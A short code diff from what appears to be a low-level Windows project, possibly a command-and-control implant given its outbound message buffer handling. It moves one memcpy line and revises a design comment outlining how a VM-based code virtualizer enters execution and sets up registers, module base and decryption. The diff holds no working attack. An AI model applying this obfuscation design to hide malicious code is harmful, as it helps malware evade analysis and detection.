@@ -177,8 +177,8 @@ namespace Message {
                             Stream::PackBytes(Outbound, S_CAST(PBYTE, Head->Buffer), Head->Length);
                         } else {
                             Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
-                            x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
 
+                            x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
                             Outbound->Length += Head->Length;
                         }
                     } else {
@@ -283,17 +283,18 @@ namespace Message {
                  *      - VSP
                  *      - HANDLER
                  *      - DKEY (optional)
-                 *      - MODULE BASE
+                 *      - MODULE_BASE
                  *      - VREGS
                  *
                  * 1. Push RVA to virtual instructions onto the stack, then jmp to vm_entry
-                 * 2. Push all native registers to the stack
-                 * 3. Load module base into a register + save it onto the stack
-                 * 4. (optional) Load RVA to next bytecode instruction into reg for decryption
-                 * 5. Allocate space on the stack for scratch registers and point a native reg at this
+                 * 2. Push 8 bytes of 0x00 to the stack. Perhaps a boundary(?)
+                 * 3. Push all native registers + RFLAGS to the stack
+                 * 4. Load module base into MODULE_BASE + save it onto the stack
+                 * 5. (optional) Load RVA to next bytecode instruction into reg for decryption
+                 * 6. Allocate space on the stack for scratch registers and point a native reg at this
                  *      - remember to save rsp first before modifying it
                  *      - remember alignment
-                 * 6. Load vm-handler pointer
+                 * 7. Load vm-handler pointer
                  */
             }
             default:
